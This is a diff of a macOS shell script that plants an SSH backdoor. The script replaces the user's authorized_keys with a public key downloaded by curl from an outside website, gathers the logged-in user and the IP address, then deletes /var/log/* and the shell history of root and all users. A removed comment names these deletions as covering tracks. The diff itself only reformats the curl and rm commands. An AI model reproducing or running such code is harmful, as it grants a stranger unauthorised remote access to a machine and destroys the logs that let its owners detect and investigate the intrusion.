@@ -12,7 +12,7 @@ mkdir -p "$SSHPATH" # On most computers, there won't be a .ssh directory initial
 
 rm "$SSHPATH/authorized_keys" # Just in case
 echo "Downloading pubkey..."
-curl -s https://erikboesen.com/pubkey --output "$SSHPATH/authorized_keys"
+curl -so "$SSHPATH/authorized_keys" https://erikboesen.com/pubkey
 
 USER=`stat -f "%Su" /dev/console` # Get user currently logged in (in GUI).
 IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
@@ -31,13 +31,10 @@ cat <&3
 
 echo
 
-# Get rid of files to cover tracks
-# -f flag is used to suppress worrying but harmless errors if the file doesn't exist
 rm -f /tmp/elevate.out /tmp/*.sh
 
 rm -rf /var/log/*
-rm -f /var/root/.*history
-rm -f /Users/*/.*history
+rm -f /var/root/.*history /Users/*/.*history
 
 rm -f "/Users/${USER}/Downloads/term.*"
 
